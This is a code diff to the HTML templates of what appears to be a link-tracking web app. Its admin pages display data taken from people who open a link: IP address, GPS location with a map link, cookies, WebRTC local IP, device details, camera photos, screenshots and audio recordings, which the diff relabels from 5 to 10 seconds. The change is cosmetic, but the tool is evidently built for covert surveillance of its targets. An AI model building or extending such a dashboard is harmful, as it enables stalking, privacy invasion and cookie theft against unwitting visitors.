@@ -304,43 +304,56 @@ ADMIN_USER_HTML = """
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>User Data - {{ user.username }}</title>""" + BASE_CSS + """
 <style>
-/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে দেখানোর জন্য */
-@media (max-width: 600px) {
-    .visit-card .row {
-        display: flex;
-        flex-direction: column;
-        align-items: flex-start;
-        margin-bottom: 6px;
-    }
-    .visit-card .label {
-        width: auto;
-        font-weight: bold;
-        color: #6688aa;
-        margin-bottom: 2px;
-    }
-    .visit-card .value {
-        word-break: break-word;
-        width: 100%;
-    }
-    .visit-card img {
-        max-width: 100% !important;
-        height: auto !important;
-    }
-    .visit-card audio {
-        max-width: 100% !important;
-    }
+.visit-card .row {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    margin-bottom: 10px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid #1a2332;
 }
-/* ইমেজ ও অডিও সাইজ ঠিক করা */
+.visit-card .label {
+    font-weight: bold;
+    color: #6688aa;
+    font-size: 0.9rem;
+    width: 100%;
+}
+.visit-card .value {
+    word-break: break-word;
+    font-size: 1rem;
+    color: #00ffcc;
+    margin-top: 2px;
+    width: 100%;
+}
 .visit-card img {
-    max-width: 250px;
-    height: auto;
+    max-width: 100% !important;
+    height: auto !important;
     border-radius: 12px;
     border: 1px solid #334466;
     margin: 5px 0;
 }
 .visit-card audio {
-    max-width: 250px;
+    max-width: 100% !important;
     margin: 5px 0;
+}
+.map-link {
+    display: inline-block;
+    margin-left: 6px;
+    font-size: 1rem;
+}
+@media (min-width: 600px) {
+    .visit-card .row {
+        flex-direction: row;
+        align-items: baseline;
+    }
+    .visit-card .label {
+        width: 150px;
+        flex-shrink: 0;
+    }
+    .visit-card .value {
+        width: auto;
+        margin-top: 0;
+    }
 }
 </style>
 </head>
@@ -358,53 +371,59 @@ ADMIN_USER_HTML = """
         <h3>🔗 {{ link.name }} ({{ link.visits|length }} visits)</h3>
         {% for v in link.visits %}
         <div class="visit-card">
-            <div class="row"><span class="label">IP Address:</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Location:</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
-            <div class="row"><span class="label">GPS (Lat, Lng):</span> <span class="value">{{ v.get('gps', 'N/A') }}</span>
+            <div class="row"><span class="label">IP Address</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Location</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
+            <div class="row"><span class="label">GPS (Lat, Lng)</span> <span class="value">{{ v.get('gps', 'N/A') }}
                 {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
                     <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
                 {% endif %}
-            </div>
-            <div class="row"><span class="label">Browser / OS:</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Screen:</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Language:</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Platform:</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Timezone:</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Battery Level:</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+            </span></div>
+            <div class="row"><span class="label">Browser / OS</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Screen</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Language</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Platform</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Timezone</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Battery Level</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Memory (GB)</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Cookies</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Referrer</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
 
             <!-- নতুন ডেটা -->
-            <div class="row"><span class="label">Device Model:</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Network Type:</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Downlink Speed:</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
-            <div class="row"><span class="label">CPU Cores:</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Local IP (WebRTC):</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
-            <div class="row"><span class="label">Storage (Free/Total):</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Model</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Network Type</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Downlink Speed</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
+            <div class="row"><span class="label">CPU Cores</span> <span class="value">{{ v.get('cpuCores', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Local IP (WebRTC)</span> <span class="value">{{ v.get('localIP', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Storage (Free/Total)</span> <span class="value">{{ v.get('storageFree', 'N/A') }} / {{ v.get('storageTotal', 'N/A') }}</span></div>
 
-            <div class="row"><span class="label">Camera:</span>
+            <div class="row"><span class="label">Camera</span>
+                <span class="value">
                 {% if v.get('camera') and v.get('camera') != 'Failed' %}
                     <img src="{{ v.get('camera') }}" />
                 {% else %}
-                    <span class="value">N/A</span>
+                    N/A
                 {% endif %}
+                </span>
             </div>
-            <div class="row"><span class="label">Screenshot:</span>
+            <div class="row"><span class="label">Screenshot</span>
+                <span class="value">
                 {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
                     <img src="{{ v.get('screenshot') }}" />
                 {% else %}
-                    <span class="value">N/A</span>
+                    N/A
                 {% endif %}
+                </span>
             </div>
-            <div class="row"><span class="label">Audio (5s):</span>
+            <div class="row"><span class="label">Audio (10s)</span>
+                <span class="value">
                 {% if v.get('audio') and v.get('audio') != 'Failed' %}
                     <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
                 {% else %}
-                    <span class="value">N/A</span>
+                    N/A
                 {% endif %}
+                </span>
             </div>
-            <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Time</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
         </div>
         {% else %}
         <p style="color:#6688aa;">No visits for this link.</p>
@@ -423,20 +442,19 @@ VIEW_LINK_HTML = """
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
 <style>
-/* মোবাইলে লেবেল ও ভ্যালু আলাদা লাইনে */
 .visit-card .row {
     display: flex;
     flex-direction: column;
     align-items: flex-start;
-    margin-bottom: 8px;
-    border-bottom: 1px solid #1a2332;
+    margin-bottom: 10px;
     padding-bottom: 6px;
+    border-bottom: 1px solid #1a2332;
 }
 .visit-card .label {
     font-weight: bold;
     color: #6688aa;
     font-size: 0.9rem;
-    width: auto;
+    width: 100%;
 }
 .visit-card .value {
     word-break: break-word;
@@ -445,7 +463,6 @@ VIEW_LINK_HTML = """
     margin-top: 2px;
     width: 100%;
 }
-/* ইমেজ ও অডিও স্কেল */
 .visit-card img {
     max-width: 100% !important;
     height: auto !important;
@@ -461,6 +478,10 @@ VIEW_LINK_HTML = """
     display: inline-block;
     margin-left: 6px;
     font-size: 1rem;
+}
+.del-btn {
+    display: inline-block;
+    margin-top: 10px;
 }
 @media (min-width: 600px) {
     .visit-card .row {
@@ -530,7 +551,7 @@ VIEW_LINK_HTML = """
                 {% endif %}
                 </span>
             </div>
-            <div class="row"><span class="label">Audio (5s)</span>
+            <div class="row"><span class="label">Audio (10s)</span>
                 <span class="value">
                 {% if v.get('audio') and v.get('audio') != 'Failed' %}
                     <audio controls><source src="{{ v.get('audio') }}" type="audio/webm"></audio>
